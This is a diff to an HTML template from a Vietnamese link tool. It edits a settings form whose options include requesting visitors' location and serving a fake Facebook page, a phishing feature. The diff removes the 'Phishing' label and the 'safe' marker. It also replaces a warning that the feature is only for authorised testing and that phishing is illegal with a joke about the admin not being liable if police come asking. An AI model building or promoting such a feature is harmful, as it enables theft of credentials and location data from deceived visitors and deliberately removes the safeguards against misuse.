@@ -25,13 +25,13 @@
                 <small>Khi bật, người truy cập sẽ thấy pop-up yêu cầu quyền truy cập vị trí.</small>
             </fieldset>
             <fieldset>
-                <legend><strong style="color: var(--pico-color-red-500);">⚠️ Tấn công Giả mạo (Phishing)</strong></legend>
+                <legend><strong style="color: var(--pico-color-red-500);"> Tấn công Giả mạo </strong></legend>
                 <label for="phishTemplate">Chọn trang để giả mạo</label>
                 <select id="phishTemplate" name="phishTemplate">
-                    <option value="" <%= !link.phishTemplate ? 'selected' : '' %>>-- Không sử dụng (An toàn) --</option>
+                    <option value="" <%= !link.phishTemplate ? 'selected' : '' %>>-- Không sử dụng --</option>
                     <option value="facebook" <%= link.phishTemplate === 'facebook' ? 'selected' : '' %>>Facebook</option>
                 </select>
-                <small><strong>Cảnh báo:</strong> Chỉ sử dụng tính năng này cho mục đích giáo dục hoặc kiểm thử bảo mật được cho phép. Lừa đảo là bất hợp pháp và bạn sẽ chịu hoàn toàn trách nhiệm.</small>
+                <small><strong>Cảnh báo:</strong> Admin sẽ không chịu trách nghiệm nếu bạn bị công an hỏi thăm =)).</small>
             </fieldset>
             <footer style="margin-top: 2rem;">
                 <p><small>Để lưu thay đổi, vui lòng xác thực Captcha.</small></p>
